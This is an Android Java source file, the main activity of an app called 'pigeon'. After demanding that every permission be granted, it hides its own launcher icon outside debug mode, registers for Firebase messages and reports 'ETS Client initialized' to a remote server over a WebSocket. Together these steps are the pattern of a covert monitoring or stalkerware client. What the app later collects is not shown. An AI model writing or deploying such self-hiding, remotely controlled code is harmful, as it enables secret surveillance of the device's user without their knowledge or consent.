package com.theah64.pigeon.activities;


import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Toast;

import com.theah64.pigeon.R;
import com.theah64.pigeon.activities.base.PermissionActivity;
import com.theah64.pigeon.asyncs.FCMSynchronizer;
import com.theah64.pigeon.model.SocketMessage;
import com.theah64.pigeon.model.User;
import com.theah64.pigeon.utils.APIRequestGateway;
import com.theah64.pigeon.utils.App;
import com.theah64.pigeon.utils.NetworkUtils;
import com.theah64.pigeon.utils.PrefUtils;
import com.theah64.pigeon.utils.WebSocketHelper;

import org.json.JSONException;

import java.io.IOException;
import java.net.URISyntaxException;


public class MainActivity extends PermissionActivity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    private void doNormalWork() {

        //Hiding app icon
        if (!App.IS_DEBUG_MODE) {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        }

        if (NetworkUtils.hasNetwork(this)) {

            new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
                @Override
                public void onReadyToRequest(String apiKey, final String userId) {
                    if (!PrefUtils.getInstance(MainActivity.this).getBoolean(User.KEY_IS_FCM_SYNCED)) {
                        new FCMSynchronizer(MainActivity.this, apiKey).execute();
                    }

                    try {
                        WebSocketHelper.getInstance(MainActivity.this, userId).send(new SocketMessage("ETS Client initialized"));
                    } catch (URISyntaxException | IOException | JSONException e) {
                        e.printStackTrace();
                    }

                }

                @Override
                public void onFailed(String reason) {

                }
            });


        }

        this.finish();
    }

    @Override
    public void onAllPermissionGranted() {
        doNormalWork();
    }

    @Override
    public void onPermissionDenial() {
        Toast.makeText(this, "All permissions must be accepted", Toast.LENGTH_SHORT).show();
        finish();
    }
}
